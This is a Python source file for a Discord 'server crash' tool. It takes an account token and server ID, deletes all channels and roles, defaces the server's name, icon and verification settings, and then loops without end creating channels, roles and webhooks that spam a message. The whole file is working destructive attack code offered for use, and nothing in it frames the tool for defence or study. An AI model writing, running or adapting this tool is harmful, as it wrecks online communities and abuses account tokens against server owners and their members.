#from messages import exm, crashMenu,menu,helpCrashEN,helpCrashRU
import messages
from requests import get, patch, delete, post
from datetime import datetime


class Crash:
    def __init__(self) -> None:
        """
        Initalization
        """
        pass

    def crash(self, jsonHook, defaultMessage, nameHooks, icons, icon, statuses):
        sessionName = "Crash"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exm)
        print(messages.crashMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                chatIds = []
                roleIds = []
                info5 = {
                    "content": defaultMessage,
                    "username": nameHooks,
                    "avatar_url": icons,
                }
                deface = {"name": "C.A.S", "verification_level": None, "icon": icon}
                x = 1
                token = input("\nToken: ")
                serverID = input("\nServer ID: ")
                headers = {"Authorization": token}
                payload = {"name": "C.A.S"}
                request = get(
                    f"https://discord.com/api/v8/guilds/{serverID}/channels",
                    headers={"Authorization": token},
                )
                if request.status_code in statuses:
                    info = request.json()
                    for iD in info:
                        chatIds.append(iD["id"])
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                    )
                request = get(
                    f"https://discord.com/api/v8/guilds/{serverID}/roles",
                    headers={"Authorization": token},
                )
                if request.status_code in statuses:
                    info2 = request.json()
                    for iD in info2:
                        roleIds.append(iD["id"])
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                    )
                req = patch(
                    f"https://discord.com/api/v9/guilds/{serverID}/widget",
                    headers=headers,
                    json={"enabled": True, "channel_id": None},
                )
                req = patch(
                    f"https://discord.com/api/v8/guilds/{serverID}",
                    headers=headers,
                    json=deface,
                )
                if req.status_code not in statuses:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
                # data1 = any(chatIds)
                # data2 = any(roleIds)
                if any(chatIds):
                    for channelID in chatIds:
                        req = delete(
                            f"https://canary.discord.com/api/v8/channels/{channelID}",
                            headers={"Authorization": token},
                        )
                        if req.status_code not in statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                if any(roleIds):
                    for roleID in roleIds:
                        req = delete(
                            f"https://discord.com/api/v8/guilds/{serverID}/roles/{roleID}",
                            headers={"Authorization": token},
                        )
                        if req.status_code not in statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                file = open("webhooks.txt", "w")
                # while x <= 200:
                while True:
                    request = post(
                        f"https://discord.com/api/v8/guilds/{serverID}/channels",
                        headers={"Authorization": token},
                        json=payload,
                    )
                    if request.status_code in statuses:
                        req = post(
                            f"https://discord.com/api/v8/guilds/{serverID}/roles",
                            headers={"Authorization": token},
                            json=payload,
                        )
                        if req.status_code in statuses:
                            # if x <= 60:
                            info3 = request.json()
                            request = post(
                                f"https://discord.com/api/v8/channels/{info3['id']}/webhooks",
                                headers={"Authorization": token},
                                json=jsonHook,
                            )
                            if request.status_code != 429:
                                info4 = request.json()
                                webhook = f"https://discordapp.com/api/webhooks/{info4['id']}/{info4['token']}"
                                req = post(webhook, data=info5)
                                if req.status_code in statuses:
                                    file.write(f"{webhook}\n")
                                else:
                                    errorLog.write(
                                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                                    )
                            else:
                                print("\nYou were given a rate limit.")
                                errorLog.write(
                                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                                )
                        else:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                            print("Error. Maybe webhook deleted...")
                    else:
                        errorLog.write(
                            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                        )
                        print("\nServer Crashed")
                    # x += 1
                    # print("\nServer crashed.")
            elif select == "2":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpCrashEN)
                elif select == "2":
                    print(messages.helpCrashRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")
